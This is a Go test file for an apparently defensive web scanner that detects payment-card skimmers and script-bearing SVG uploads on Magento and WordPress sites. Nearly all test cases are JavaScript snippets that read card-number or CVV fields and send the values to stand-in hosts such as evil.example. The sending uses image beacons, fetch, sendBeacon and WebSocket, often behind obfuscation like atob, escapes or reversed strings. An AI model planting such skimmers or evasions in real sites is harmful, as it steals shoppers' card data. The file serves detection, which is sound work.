package web

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"math/rand/v2"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/cpibia/tripwatch/internal/collector"
)

func TestSkimmerSignals(t *testing.T) {
	for name, c := range map[string]struct {
		src  string
		want bool
	}{
		"image beacon": {`document.querySelector('[name="payment[cc_number]"]').addEventListener('blur',function(e){new Image().src='https://cdn-stats.example.com/p?d='+btoa(e.target.value)})`, true},
		"websocket":    {`var w=new WebSocket("wss://ws.example.net/c");jQuery('#cc_cid').on('change',function(){w.send(this.value)})`, true},
		"obfuscated":   {`var _0x=atob("aHR0cHM6Ly9leGFtcGxlLmNvbQ==");var c=document.getElementById("card-number").value;`, true},
		"harvest":      {`document.querySelectorAll("input").forEach(function(i){if(/cvv|card/.test(i.name))d[i.name]=i.value});navigator.sendBeacon(atob("Ly9leC5leGFtcGxl"),JSON.stringify(d))`, true},
		"bundle":       {`$(document).find("form").each(function(){var f=new FormData(this)});var i=new Image();i.src="https://cdn.example.org/x.gif";var g=new Function("return this")()`, false},
		// Built here so that no secret scanner takes the test for a leaked key.
		"secret key":             {`var k = "` + "sk_" + "live_" + strings.Repeat("Ab3", 8) + `";`, true},
		"payment form":           {`define(['jquery'],function($){return {getData:function(){return {cc_number:$('#cc_number').val(),cc_cid:$('#cc_cid').val()}}, save:function(d){return $.ajax({url:'/rest/V1/carts/mine/payment-information',type:'POST',data:d})}}})`, false},
		"analytics":              {`(function(){var i=new Image();i.src="https://www.google-analytics.com/collect?v=1&t=pageview"})()`, false},
		"atob names":             {`var f=document.querySelector(atob("W25hbWU9InBheW1lbnRbY2NfbnVtYmVyXSJd"));f.onblur=function(){new Image().src="https://img.example.com/p?d="+f.value}`, true},
		"escaped names":          {`var n="\x63\x61\x72\x64\x5f\x6e\x75\x6d\x62\x65\x72";$("#"+n).on("blur",function(){navigator.sendBeacon("https://x.example.net/c",this.value)})`, true},
		"split atob":             {`var f=document.querySelector('[name="'+atob("cGF5bWVudFtj")+atob("Y19udW1iZXJd")+'"]');f.onblur=function(){new Image().src="https://img.example.com/p?d="+f.value}`, true},
		"reversed":               {`var n="]rebmun_cc[tnemyap".split("").reverse().join("");var f=document.querySelector('[name="'+n+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"char codes":             {`var n=String.fromCharCode(99,99,95,110,117,109,98,101,114);$("#"+n).on("blur",function(){new Image().src="https://x.example.net/c?"+this.value})`, true},
		"concatenated":           {`var f=document.querySelector('[name="'+'payment[cc'+'_num'+'ber]'+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"lone escapes":           {`var f=document.querySelector('[name="p\x61yment[cc_n\x75mber]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"code points":            {"var f=document.querySelector('[name=\"p\\u{61}yment[cc_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"octal":                  {`var f=document.querySelector('[name="p\141yment[cc_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"template":               {"var f=document.querySelector(`[name=\"payment[cc_n\\x75mber]\"]`);new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"atob template":          {"var f=document.querySelector(atob(`W25hbWU9InBheW1lbnRbY2NfbnVtYmVyXSJd`));new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"comment between":        {`var f=document.querySelector('[name="payment[cc'/*x*/+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"parenthesised":          {`var f=document.querySelector('[name="'+('payment[cc'+('_num'+'ber]'))+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"continued line":         {"var f=document.querySelector('[name=\"payment[cc_\\\nnumber]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"empty substitute":       {"var f=document.querySelector(`[name=\"payment[cc${''}_number]\"]`);new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"concat":                 {`var f=document.querySelector('[name="payment[cc'.concat('_num','ber]"]'));new Image().src="https://img.example.com/p?d="+f.value`, true},
		"constant":               {`var a="payment[cc",b=a+"_number]";var f=document.querySelector('[name="'+b+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"atob of constant":       {`const k="cGF5bWVudFtjY19udW1iZXJd";var f=document.querySelector('[name="'+atob(k)+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"array joined":           {`var f=document.querySelector('[name="'+["payment[cc","number]"].join("_")+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"after a regex":          {`var r=/["']/g;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"sliced":                 {`var f=document.querySelector('[name="'+'xxpayment[cc_number]'.slice(2)+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"replaced":               {`var f=document.querySelector('[name="'+'payment[cc_nuXXmber]'.replace('XX','')+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"parens first":           {`var f=document.querySelector('[name="'+(('payment[c')+'c_number]')+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"regex after if":         {`if(x)/["']/.test(y);var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"regex after block":      {`{x()}/["']/.test(y);var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"both readings":          {`if(1){}/'/.test(1);var q=(1)/2;var s='payment[c'+'c_n'+'umber]';var f=document.querySelector('[name="'+s+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"both readings reversed": {`var q=(1)/2;if(1){}/'/.test(1);var f=document.querySelector('[name="'+'payment[c'+'c_n'+'umber]'+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"slashes in blocks":      {"{q=(1)/2}{if(1){}/'/.test(1)}{s='payment[c'+'c_n'+'umber]'}\nvar f=document.querySelector('[name=\"'+s+'\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"function expression":    {"var q=function(){}/2;if(1){}/'/.test(1);var f=document.querySelector('[name=\"'+'payment[c'+'c_n'+'umber]'+'\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"class expression":       {"var q=class{}/2;l:{}/'/.test(1);var f=document.querySelector('[name=\"'+'payment[c'+'c_n'+'umber]'+'\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"division after ++":      {`i++/2/3;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"after an object":        {`var o={a:1}/2;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"keyword property":       {`var x=a.return/2;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"after a function":       {`var g=function(){}/2;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"after a class":          {`var g=class{}/2;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
		"after a labelled block": {"l:{}/'/;var f=document.querySelector('[name=\"payment[cc'+'_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"after an arrow":         {"var g=()=>{}\n/'/;var f=document.querySelector('[name=\"payment[cc'+'_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
		"jquery-ish":             {`jQuery.fn.extend({serialize:function(){return jQuery.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=jQuery.prop(this,"elements");return e?jQuery.makeArray(e):this})}})`, false},
	} {
		if got := skimmerSignals([]byte(c.src)) != nil; got != c.want {
			t.Errorf("%s: %v (%v), want %v", name, got, skimmerSignals([]byte(c.src)), c.want)
		}
	}
}

// A skimmer appended to a bundle that existed is named once the change is seen; an SVG that runs
// script in the uploads is reported as it lands.
func TestSkimmerInChangedBundle(t *testing.T) {
	tr := newTree(t)
	tr.file("var/www/shop/bin/magento", "#!/usr/bin/env php")
	tr.file("var/www/shop/app/etc/di.xml", "<config/>")
	tr.file("var/www/shop/pub/index.php", "<?php")
	tr.file("var/www/shop/pub/static/frontend/requirejs-config.js", "require.config({map:{'*':{}}});")
	tr.file("var/www/shop/pub/static/frontend/checkout.js", "define(['jquery'],function($){return {cc_number:$('#cc_number').val()}})")
	c := &Collector{StateDir: t.TempDir()}
	scan := func() AppReport {
		t.Helper()
		out, err := c.Collect(context.Background(), collector.NewSource(tr.root))
		if err != nil {
			t.Fatal(err)
		}
		for _, a := range out.(Result).Apps {
			if a.Path == "/var/www/shop" {
				return a
			}
		}
		t.Fatal("application not found")
		return AppReport{}
	}
	scan()
	if err := c.Commit(); err != nil {
		t.Fatal(err)
	}
	tr.file("var/www/shop/pub/static/frontend/requirejs-config.js", "require.config({map:{'*':{}}});\n"+
		`document.addEventListener('change',function(){var v=document.querySelector('[name="payment[cc_number]"]');if(v){new Image().src='https://img.example.com/i.gif?c='+v.value}});`)
	tr.file("var/www/shop/pub/media/custom_options/quote/x.svg", `<svg xmlns="http://www.w3.org/2000/svg" onload="eval(atob('YWxlcnQoMSk='))"/>`)
	tr.file("var/www/shop/pub/media/catalog/logo.svg", `<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0h10v10z"/></svg>`)
	var got []string
	for _, f := range scan().Findings {
		got = append(got, f.Kind+" "+f.Path+" "+strings.Join(f.Signatures, ","))
	}
	slices.Sort(got)
	want := []string{
		"active_svg_in_upload_dir /var/www/shop/pub/media/custom_options/quote/x.svg svg_script,obfuscation",
		"payment_skimmer /var/www/shop/pub/static/frontend/requirejs-config.js payment_fields,exfiltration",
	}
	if !slices.Equal(got, want) {
		t.Errorf("findings:\n got  %q\n want %q", got, want)
	}
}

// Skimmer families on a corpus of clean scripts (WEB_CORPUS): no file holds a skimmer's shape.
func TestSkimmerOnCleanCorpus(t *testing.T) {
	dir := os.Getenv("WEB_CORPUS")
	if dir == "" {
		t.Skip("WEB_CORPUS not set")
	}
	files, medium := 0, 0
	err := filepath.WalkDir(dir, func(p string, d os.DirEntry, err error) error { //nolint:gosec // a test corpus chosen by whoever runs it
		if err != nil || d.IsDir() || !slices.Contains(skimmerExtensions, strings.ToLower(filepath.Ext(p))) || isScript(strings.ToLower(d.Name())) {
			return err
		}
		data, err := os.ReadFile(p) //nolint:gosec // a test corpus chosen by whoever runs it
		if err != nil {
			return err
		}
		files++
		var f skimmerFamilies
		f.scan(data)
		if sigs := f.verdict(); sigs != nil {
			t.Errorf("%s: %v", p, sigs)
		} else if f.fields && f.host {
			medium++
			t.Logf("medium %s", p)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	t.Logf("%d files, %d with a payment field and another host", files, medium)
}

// Many files changed at once leave out the packages updated as a whole and generated bundles,
// not a skimmer in a file changed on its own; decoys of other kinds do not count; a skimmer
// padded past the size read at once is still seen; an SVG script under any namespace prefix runs.
func TestSkimmerEvasions(t *testing.T) {
	// The padded script is read whole, however slow the race detector makes it.
	saved := maxSkimmerFileTime
	maxSkimmerFileTime = time.Hour
	t.Cleanup(func() { maxSkimmerFileTime = saved })
	tr := newTree(t)
	tr.file("var/www/blog/wp-includes/version.php", "<?php $wp_version = '6.6';")
	tr.file("var/www/blog/wp-content/themes/shop/checkout.js", "jQuery(function(){})")
	tr.file("var/www/blog/wp-content/themes/shop/big.js", "jQuery(function(){})")
	tr.file("var/www/blog/wp-content/plugins/builder/builder.php", "<?php /* Version: 1.0 */")
	tr.file("var/www/blog/wp-content/themes/shop/style.css", "/* Theme Name: Shop\nVersion: 2.1 */")
	c := &Collector{StateDir: t.TempDir()}
	scan := func() (AppReport, []string) {
		t.Helper()
		out, err := c.Collect(context.Background(), collector.NewSource(tr.root))
		if err != nil {
			t.Fatal(err)
		}
		if err := c.Commit(); err != nil {
			t.Fatal(err)
		}
		res := out.(Result)
		for _, a := range res.Apps {
			if a.Path == "/var/www/blog" {
				return a, res.Issues
			}
		}
		t.Fatal("application not found")
		return AppReport{}, nil
	}
	skimmer := `document.addEventListener("change",function(){var v=document.querySelector('[name="payment[cc_number]"]');if(v){new Image().src="https://img.example.com/i.gif?c="+v.value}});`
	scan()
	// The builder plugin is updated, its version with it; the shop theme gets decoys at the same
	// version, put there with the skimmer.
	tr.file("var/www/blog/wp-content/plugins/builder/builder.php", "<?php /* Version: 1.1 */")
	for i := range 60 {
		tr.file(fmt.Sprintf("var/www/blog/wp-content/notes/%02d.txt", i), "x")
		tr.file(fmt.Sprintf("var/www/blog/wp-content/plugins/builder/assets/%02d.js", i), skimmer)
		tr.file(fmt.Sprintf("var/www/blog/wp-content/themes/shop/js/%02d.js", i), "jQuery(function(){})")
	}
	tr.file("var/www/blog/wp-content/themes/shop/checkout.js", "jQuery(function(){});\n"+skimmer)
	tr.file("var/www/blog/wp-content/themes/shop/big.js", `var v=document.querySelector('[name="payment[cc_number]"]');/*`+
		strings.Repeat("x", maxInMemory+skimmerChunk)+`*/new Image().src="https://img.example.com/i.gif?c="+v.value;`)
	tr.file("var/www/blog/wp-content/uploads/x.svg", `<svg xmlns="http://www.w3.org/2000/svg"><x:script xmlns:x="http://www.w3.org/2000/svg">alert(1)</x:script></svg>`)
	app, issues := scan()
	var got []string
	for _, f := range app.Findings {
		if f.Kind == KindSkimmer || f.Kind == KindActiveSVG {
			got = append(got, f.Kind+" "+strings.TrimPrefix(f.Path, "/var/www/blog/"))
		}
	}
	slices.Sort(got)
	want := []string{"active_svg_in_upload_dir wp-content/uploads/x.svg", "payment_skimmer wp-content/themes/shop/big.js", "payment_skimmer wp-content/themes/shop/checkout.js"}
	if !slices.Equal(got, want) {
		t.Errorf("findings:\n got  %q\n want %q", got, want)
	}
	if !slices.ContainsFunc(issues, func(i string) bool { return strings.Contains(i, "wp-content/plugins/builder") }) {
		t.Errorf("the package updated as a whole is not named: %q", issues)
	}
}

// What a bracket opened decides a "/" after it only where a tokenizer is sure; a conditional's
// object, a class extending a function, a line break after return, for await and a template
// substitution are read without hiding the strings built after them.
func TestSkimmerAfterUncertainBrackets(t *testing.T) {
	use := `var f=document.querySelector('[name="'+s+'"]');new Image().src="https://img.example.com/p?d="+f.value`
	build := `var s='payment[c'+'c_n'+'umber]';`
	for name, before := range map[string]string{
		"ternary object":                 "var q=1?0:{}/1;" + build + "var z=1/2;",
		"class extends function":         "var q=class extends (function(){}){}/1;" + build + "var z=1/2;",
		"return and a line break":        "function g(){return\n{}/'/.test(1)};" + build,
		"for await":                      "async function h(){for await(const x of [])/'/.test(1)};" + build,
		"template substitution":          "var t=`${1}'`;" + build + "var u=`'`;",
		"template far before":            "var h=`${1}`;" + strings.Repeat("var a=1;", 700) + build,
		"label in a function expression": "(function(){l:{}/'/.test(1);" + build + "\n})()",
		"for's third clause":             "for(;0;{}/1);" + build + "var z=1/2;",
		"of as a name":                   "var of=4;var q=of/2;" + build + "var z=1/2;",
		"of and a line break":            "var of=1;of\n{}/'/.test(1);" + build,
	} {
		if skimmerSignals([]byte(before+use)) == nil {
			t.Errorf("%s: not found", name)
		}
	}
	// The brackets open where a piece ends go on in the next: a "(" one piece before its ")".
	src := []byte("var q,s;{if(1){q=(1" + strings.Repeat(" ", skimmerChunk+skimmerChunk/2) + ")/2}/'/.test(1)}{" + build + "}\n" + use)
	var fam skimmerFamilies
	for off := 0; off < len(src); off += skimmerChunk {
		fam.scan(src[off:min(len(src), off+skimmerChunk+skimmerOverlap)])
	}
	if fam.verdict() == nil {
		t.Error("brackets across pieces: not found")
	}
	// A template whose text runs past where the next piece starts: read as code there, its "/*"
	// would hide the skimmer after the end of the first piece.
	src = []byte(strings.Repeat(" ", skimmerChunk-50) + "var t=`abc" + strings.Repeat("x", 100) + "/*`;" +
		strings.Repeat("var a=1;", skimmerOverlap/8+64) + build + use + "/*x*/")
	fam = skimmerFamilies{}
	for off := 0; off < len(src); off += skimmerChunk {
		fam.scan(src[off:min(len(src), off+skimmerChunk+skimmerOverlap)])
	}
	if fam.verdict() == nil {
		t.Error("template across pieces: not found")
	}
}

// The forms of comment a browser's script reads, every line terminator, and literals longer than
// what the folding keeps are passed over as JavaScript does: none of them makes the tokenizer read
// a comment or a literal as code, nor code as a comment.
func TestSkimmerAcrossCommentsAndLongLiterals(t *testing.T) {
	skim := `var s='payment[c'+'c_n'+'umber]';var f=document.querySelector('[name="'+s+'"]');new Image().src="https://img.example.com/p?d="+f.value;`
	x := strings.Repeat("x", maxLiteral+100)
	for name, src := range map[string]string{
		"html open comment":       "var a=1;\n<!--/*\n" + skim + "\n//*/\n",
		"html close comment":      "var a=1;\n-->/*\n" + skim + "\n//*/\n",
		"hashbang":                "#!/*\n" + skim + "\n//*/\n",
		"line separator":          "var a=1;//x\u2028" + skim + "\u2028var b=2;",
		"paragraph separator":     "var a=1;//x\u2029" + skim + "\u2029var b=2;",
		"carriage return":         "var a=1;//x\r" + skim + "\rvar b=2;",
		"long string":             "var t='" + x + "/*';" + skim + "var e='*/';",
		"long template":           "var t=`" + x + "/*`;" + skim + "var e='*/';",
		"long regular expression": "var t=/" + x + "\\/*/;" + skim + "var e='*/';",
	} {
		if skimmerSignals([]byte(src)) == nil {
			t.Errorf("%s: not found", name)
		}
	}
}

// Every white space and line terminator of JavaScript reads as the tokenizer's own, a line
// continuation inside a literal joins it, a module's operators that look like comments are read
// both ways, and a piece that starts a line knows it.
func TestSkimmerAcrossWhiteSpaceAndModules(t *testing.T) {
	use := `;var f=document.querySelector('[name="'+s+'"]');new Image().src="https://img.example.com/p?d="+f.value;`
	skim := `var s='payment[c'+'c_n'+'umber]'` + use
	for name, src := range map[string]string{
		"no-break space":           "var\u00a0s='payment[c';var f=document.querySelector('[name=\"'+s+'c_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value;",
		"ideographic space":        "var\u3000s='payment[c';var f=document.querySelector('[name=\"'+s+'c_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value;",
		"vertical tab":             "var\vs='payment[c';var f=document.querySelector('[name=\"'+s+'c_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value;",
		"line separator in a name": "var s='payment[c\\\u2028c_number]'" + use,
		"long string and CRLF":     "var t='" + strings.Repeat("x", maxLiteral+100) + "\\\r\ndef';var z='/*';" + skim + "\nvar w='*/';",
		"byte order mark":          "\ufeff#!/*\n" + skim + "\n//*/\n",
		"module comparison":        "var a=0,b=1;a<!--b;" + skim,
		"module decrement":         "var x=1\n-->0;" + skim,
	} {
		if skimmerSignals([]byte(src)) == nil {
			t.Errorf("%s: not found", name)
		}
	}
	// "-->" first in a piece is a comment when the piece before ended its line.
	src := []byte(strings.Repeat(" ", skimmerChunk-1) + "\n-->/*\n" + strings.Repeat("var a=1;", skimmerOverlap/8+64) + skim + "\n//*/\n")
	var fam skimmerFamilies
	for off := 0; off < len(src); off += skimmerChunk {
		fam.scan(src[off:min(len(src), off+skimmerChunk+skimmerOverlap)])
	}
	if fam.verdict() == nil {
		t.Error("a line start across pieces: not found")
	}
}

// The families are searched on the script as the tokenizer read it too: a call through brackets,
// a comment or an escape in its name, a member named by a string, a host joined from literals.
func TestSkimmerSignalsOnTokens(t *testing.T) {
	fields := `var f=document.querySelector('[name="payment[cc_number]"]');`
	for name, src := range map[string]string{
		"new through brackets":     fields + `new(Image)().src="https://img.example.com/p?d="+f.value`,
		"new and a comment":        fields + `new/**/Image().src="https://img.example.com/p?d="+f.value`,
		"escaped name":             fields + `new Imag\u0065().src="https://img.example.com/p?d="+f.value`,
		"spaced member":            fields + `navigator. sendBeacon("https://img.example.com/p",f.value)`,
		"member by string":         fields + `navigator['send'+'Beacon']("https://img.example.com/p",f.value)`,
		"joined host":              fields + `fetch("https://"+"img.example.com/p",{method:"POST",body:f.value})`,
		"escaped tab before a URL": fields + `fetch('\thttps://img.example.com/p?d='+f.value)`,
		"backslashes in a URL":     fields + `fetch('https:\\\\img.example.com/p?d='+f.value)`,
		"full-width host":          fields + "fetch('https://\uff49\uff4d\uff47.example.com/p?d='+f.value)",
		"thousands of brackets":    fields + "new" + strings.Repeat("(", 2100) + "Image" + strings.Repeat(")", 2100) + `().src="https://img.example.com/p?d="+f.value`,
		"percent-encoded host":     fields + `fetch('https://%65vil%2Eexample/p?d='+f.value)`,
		"IPv4 as one number":       fields + `fetch('https://3232235777/p?d='+f.value)`,
		"IPv4 in hexadecimal":      fields + `fetch('http://0x7f.1/p?d='+f.value)`,
		"IPv6":                     fields + `fetch('https://[2001:db8::1]/p?d='+f.value)`,
		"template with a value":    fields + "fetch(`https://evil.example/p?d=${f.value}`)",
		"URL in a constant":        fields + `var u='https://evil.example/p?d=';fetch(u+f.value)`,
		"URL with a base":          fields + `fetch(new URL('/p?d='+f.value,'https://evil.example'))`,
		"location":                 fields + `location.href='https://evil.example/p?d='+f.value`,
		"window.open":              fields + `window.open('https://evil.example/p?d='+f.value)`,
		"event source":             fields + `new EventSource('https://evil.example/p?d='+f.value)`,
		"script element":           fields + `var s=document.createElement('script');s.src='https://evil.example/p?d='+f.value`,
		"brackets around the URL":  fields + `fetch((('https://evil.example/p?d='+f.value)))`,
		"comma operator":           fields + `fetch((0,'https://evil.example/p?d=')+f.value)`,
		"built decoder name":       `var f=document.querySelector('[name="'+globalThis['at'+'ob']('cGF5bWVudFtjY19udW1iZXJd')+'"]');new Image().src="https://img.example.com/p?d="+f.value`,
		"folded letter":            `var n='ſecurity_code'.toUpperCase().toLowerCase();new Image().src="https://img.example.com/p?d="+n`,
		"escaped atob":             `var n=\u0061tob("W25hbWU9InBheW1lbnRbY2NfbnVtYmVyXSJd");var f=document.querySelector(n);`,
	} {
		if skimmerSignals([]byte(src)) == nil {
			t.Errorf("%s: not found", name)
		}
	}
}

// A name is read the way a CSS selector matches it, the ways out include markup written into the
// page and attributes set on it, and only a literal that is really data hides what it holds.
func TestSkimmerSelectorsExitsAndData(t *testing.T) {
	const send = `;new Image().src="https://img.example.com/p?d="+f.value`
	for name, src := range map[string]string{
		"split name":            `var f=document.querySelector('[name^=card][name$=number]')` + send,
		"quoted split name":     `var f=document.querySelector('input[name^="card"][name$="number" i]')` + send,
		"CSS escape":            `var f=document.querySelector('[name=\\63 vv]')` + send,
		"CSS escape no blank":   `var f=document.querySelector('[name*=\\000063vv]')` + send,
		"base64 head in code":   `var base64;var v=0;base64,0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+cardnumber.value` + send,
		"prefix only":           `var f=document.querySelector('[name^="card_num"]')` + send,
		"contains only":         `var f=document.querySelector('[name*="rd_numb"]')` + send,
		"grouped by is()":       `var f=document.querySelector(':where([name^="card"]):is([name$="number"])')` + send,
		"namespace and comment": `var f=document.querySelector('[*|name/**/^="card" s][name$="number" s]')` + send,
		"placeholder":           `var f=document.querySelector('input[placeholder*="Card number"]')` + send,
		"autocomplete":          `var f=document.querySelector('input[autocomplete="cc-csc"]')` + send,
		"split id":              `var f=document.querySelector('[id^="card_n"][id$="umber"]')` + send,
		"split name with a gap": `var f=document.querySelector('[name^="payment[c"][name$="_number]"]')` + send,
		"escaped id":            `var f=document.querySelector('#card\\4e umber')` + send,
		"worker":                `var f=document.querySelector('[name="cc_number"]');new Worker('https://evil.example/w.js').postMessage(f.value)`,
		"long sum":              `var f=document.forms[0].cardnumber;var v=(0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+0+cardnumber.value)` + send,
		"document.write":        `var f=document.querySelector('[name="cc_number"]');document.write('<img src="https://evil.example/p?d='+f.value+'">')`,
		"innerHTML":             `var f=document.querySelector('[name="cc_number"]');d.innerHTML='<img src=https://evil.example/p?d='+f.value+'>'`,
		"insertAdjacentHTML":    `var f=document.querySelector('[name="cc_number"]');d.insertAdjacentHTML('beforeend','<form action="https://evil.example/p?d='+f.value+'">')`,
		"setAttribute":          `var f=document.querySelector('[name="cc_number"]');i.setAttribute('src','https://evil.example/p?d='+f.value)`,
		"Audio":                 `var f=document.querySelector('[name="cc_number"]');new Audio('https://evil.example/p?d='+f.value)`,
		"Object.assign":         `var f=document.querySelector('[name="cc_number"]');Object.assign(new Image(),{src:'https://evil.example/p?d='+f.value})`,
		"import":                `var f=document.querySelector('[name="cc_number"]');import('https://evil.example/p.js?d='+f.value)`,
	} {
		if skimmerSignals([]byte(src)) == nil {
			t.Errorf("%s: not found", name)
		}
	}
	png := base64.StdEncoding.EncodeToString(append([]byte("\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00"), bytes.Repeat([]byte{0, 1, 2, 0xff}, 40)...))
	for name, src := range map[string]string{
		"data URI": `var i='data:image/png;base64,` + png[:40] + `cardnumberAA` + png[40:] + `';new Image().src="https://img.example.com/p?d="+i`,
		"literal":  `var i="` + png[:40] + `cardnumberAA` + png[40:] + `";logo.src=i;new Image().src="https://img.example.com/p?d="+location.hash`,
	} {
		if s := skimmerSignals([]byte(src)); s != nil {
			t.Errorf("%s: %v", name, s)
		}
	}
}

// A field a selector names only by a generic part is no payment field; a payment field read with
// another host named in the script, and no way out the search knows, is the weaker signal.
func TestPaymentFieldWithHost(t *testing.T) {
	families := func(src string) skimmerFamilies {
		var f skimmerFamilies
		f.scan([]byte(src))
		return f
	}
	for _, sel := range []string{`[name$="number"]`, `[name*="phone_number"]`, `[name="express_checkout"]`, `[name^="exp"]`} {
		if f := families(`var f=document.querySelector('` + sel + `');new Image().src="https://img.example.com/p?d="+f.value`); f.fields {
			t.Errorf("%s read as a payment field", sel)
		}
	}
	f := families(`var f=document.querySelector('[name="cc_number"]');$('body').append('<img src="https://evil.example/p?d='+f.value+'">')`)
	if f.verdict() != nil || !f.fields || !f.host {
		t.Errorf("jQuery markup: %v fields=%v host=%v", f.verdict(), f.fields, f.host)
	}
	if f := families(`var f=document.querySelector('[name="cc_number"]');console.log(f.value)`); f.host {
		t.Error("a host without a URL")
	}
}

// The searches near their anchors and the scan for long base64 literals give the answers of the
// patterns they stand for, on text without runs of blanks longer than a window.
func TestAnchoredSearchesMatchThePatterns(t *testing.T) {
	parts := []string{"cc", "_", "number", "card", "holder", "cvv", "2", "cvc", "security", "-code", "expir", "ation", "_month",
		"payment[", "x", " ", ".", "new", "(", ")", "Image", "window", "WebSocket", "sendBeacon", "fetch", "'", `"`, "https:", "//",
		"a.example", "POST", ",", "url", ":", "$.", "ajax", ".open", "no-cors", "querySelectorAll", "input", "elements", "FormData",
		"XMLHttpRequest", "atob", "String.fromCharCode", "Function", "eval", "unescape", `\x41`, "=", "QUJD", "+", "/",
		strings.Repeat("(", 70), strings.Repeat(")", 70), "https://" + strings.Repeat("a", 63) + ".example.com/p", strings.Repeat("x", 300),
		"\u017f", "\u212a", "ſecurity_code", "\u212aard", ";", "  "}
	rng := rand.New(rand.NewPCG(1, 2)) //nolint:gosec // a seeded generator, so a failure repeats
	// What earlier windows of a fixed width missed, whole.
	for _, text := range []string{
		"new" + strings.Repeat("(", 70) + "Image" + strings.Repeat(")", 70) + "().src=1",
		"new" + strings.Repeat("(", 70) + "window.Image" + strings.Repeat(")", 70) + "()",
		"fetch('https://" + strings.Repeat("a", 53) + ".example.com/p?d='+f.value)",
		"x.open('POST','https://" + strings.Repeat("a", 60) + ".example.com/p')",
		"new" + strings.Repeat("(", 70) + "Function" + strings.Repeat(")", 70) + "('x')",
		"'ſecurity_code'",
	} {
		lower := lowerFold([]byte(text))
		got := matchNear(paymentFieldsLower, lower, paymentAnchors, nil) || matchNear(exfiltrationLower, lower, exitAnchors, nil) || hidden([]byte(text))
		if !got {
			t.Errorf("%.60q...: missed", text)
		}
	}
	for range 20000 {
		var b strings.Builder
		for range 1 + rng.IntN(32) {
			b.WriteString(parts[rng.IntN(len(parts))])
		}
		text := []byte(b.String())
		lower := lowerFold(text)
		// The regions against the full patterns on the same folded text; the folding has cases of
		// its own above.
		for name, c := range map[string][2]bool{
			"fields":  {matchNear(paymentFieldsLower, lower, paymentAnchors, nil), paymentFields.Match(lower)},
			"harvest": {matchNear(formHarvestLower, lower, harvestAnchors, nil), formHarvest.Match(lower)},
			"exits":   {matchNear(exfiltrationLower, lower, exitAnchors, nil), exfiltration.Match(lower)},
			"sends":   {matchNear(sendsLower, lower, sendAnchors, nil), sends.Match(lower)},
			"hidden":  {hidden(text), obfuscation.Match(lower) || reversed.Match(text)},
		} {
			if c[0] != c[1] {
				t.Fatalf("%s on %q: %v, the pattern says %v", name, text, c[0], c[1])
			}
		}
	}
	long := "'" + strings.Repeat("QUJD", 100) + "=='"
	for _, s := range []string{long, long[:len(long)-4] + "'", "'" + strings.Repeat("QUJD", 99) + "'", `x"` + strings.Repeat("a/+9", 101) + `"y`} {
		if got, want := longBase64([]byte(s)), obfuscation.MatchString(s); got != want {
			t.Errorf("longBase64 on a %d-byte literal: %v, the pattern says %v", len(s), got, want)
		}
	}
}

// A string that a browser reads as a URL to another host reads so here too, whatever spacing,
// backslashes or Unicode host it is written with.
func TestWHATWGURLs(t *testing.T) {
	for in, want := range map[string]string{
		" https://evil.example/p":     "https://evil.example/p",
		"\thttps://evil.example/p":    "https://evil.example/p",
		"\nhttps://evil.example/p":    "https://evil.example/p",
		`https:\\evil.example/p`:      "https://evil.example/p",
		`\\evil.example/p`:            "//evil.example/p",
		`https:/\evil.example/p`:      "https://evil.example/p",
		"https://ev\til.example/p":    "https://evil.example/p",
		"https://evil。example/p":      "https://evil.example/p",
		"https://ｅｖｉｌ.example/p":      "https://evil.example/p",
		"HTTPS://Evil.Example/P":      "https://evil.example/P",
		"https://user@evil.example/p": "https://evil.example/p",
	} {
		if got, ok := whatwgURL(in); !ok || got != want {
